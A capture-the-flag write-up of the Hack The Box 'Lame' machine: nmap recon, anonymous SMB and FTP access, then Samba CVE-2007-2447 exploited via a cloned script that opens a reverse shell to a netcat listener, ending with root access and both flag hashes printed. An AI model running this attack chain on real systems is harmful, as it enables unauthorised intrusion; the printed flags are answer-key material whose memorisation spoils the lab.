### IP
`10.10.10.3`

# Recon

### nmap
`nmap -sC -sV 10.10.10.3 -o Lame.nmap`

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-17 13:36 EST
Nmap scan report for 10.10.10.3
Host is up (0.059s latency).
Not shown: 998 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.19
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
139/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OS: Unix

Host script results:
|_clock-skew: mean: 2h33m48s, deviation: 3h32m10s, median: 3m46s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2020-11-17T13:41:14-05:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.65 seconds

```
* ftp is open with anonymous login... we can try that
* smb is running on samba with a workgroup named `WORKGROUP`


### smb
* We can view smb share drives with the command `smbmap -H 10.10.10.3`
```
[+] IP: 10.10.10.3:445	Name: 10.10.10.3                                        
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	tmp                                               	READ, WRITE	oh noes!
	opt                                               	NO ACCESS	
	IPC$                                              	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$                                            	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))

```
* looks like the `/tmp` share is open to us... let's try to connect:
* `smbclient //10.10.10.3/tmp` gives us the error: `protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED`
	* Apparently smbclient prevents people from connecting with insecure protocols
	* [this](https://www.linuxquestions.org/questions/slackware-14/can-not-access-samba-shares-on-current-samba-4-11-a-4175662348/) link showed me that we can add `--option='client min protocol=NT1'` to the end to prevent this
* `smbclient //10.10.10.3/tmp --option='client min protocol=NT1'` with no password logs us in as anonymous
* When we show the directory, we get this:
```
smb: \> dir
  .                                   D        0  Tue Nov 17 14:25:16 2020
  ..                                 DR        0  Sat Oct 31 03:33:58 2020
  muhbufy                             N        0  Tue Nov 17 14:00:56 2020
  .ICE-unix                          DH        0  Tue Nov 17 13:40:24 2020
  vmware-root                        DR        0  Tue Nov 17 13:40:51 2020
  .X11-unix                          DH        0  Tue Nov 17 13:40:52 2020
  uhux                                N        0  Tue Nov 17 13:58:50 2020
  .X0-lock                           HR       11  Tue Nov 17 13:40:52 2020
  5563.jsvc_up                        R        0  Tue Nov 17 13:41:30 2020
  nqiqpy                              N        0  Tue Nov 17 13:59:08 2020
  vgauthsvclog.txt.0                  R     1600  Tue Nov 17 13:40:22 2020

		7282168 blocks of size 1024. 5386460 blocks available
```
* I went through the files and used the `more` command to look at the contents. Nothing interesting

# Exploitation

### ftp
* login to ftp with `ftp 10.10.10.3`
	* username is `anonymous`
	* no password

* After some looking around, it looks like there aren't any files on the system
	* Maybe we can upload something later?

### smb
* We can look up exploits for samba here by executing `searchsploit samba 3.0.20`
	* There's an exploit called the username map script
* I tried for a while to get this working with the metasploit module, but it wouldn't work
* Looking up some exploits, I found a recently updated one on github [here](https://github.com/amriunix/CVE-2007-2447)
* Let's clone it into our directory with `git clone https://github.com/amriunix/CVE-2007-2447`
* Make sure the dependencies are installed and run `python3 usermap_script.py 10.10.10.3 139 10.10.14.19 4444`
	* Note, `10.10.14.19` should be replaced with your host ip on the vpn (tun0 interface for me)
* In a separate window, we can open a reverse netcat listener with `nc -lvp 4444`
* Running the python command, we get a response:
```
Listening on 0.0.0.0 4444
Connection received on 10.10.10.3 33583
ls
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
initrd.img.old
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
```
* If we cd into the `/home/makis/` directory, we can use `cat user.txt` to get the user flag: `3f5539240389b28cd772586d540c28e6`
* If we cd into the `/root/` directory we can use `cat root.txt` to get the root flag: `646c15a52c04788f2bfaf1a25d402fb4`
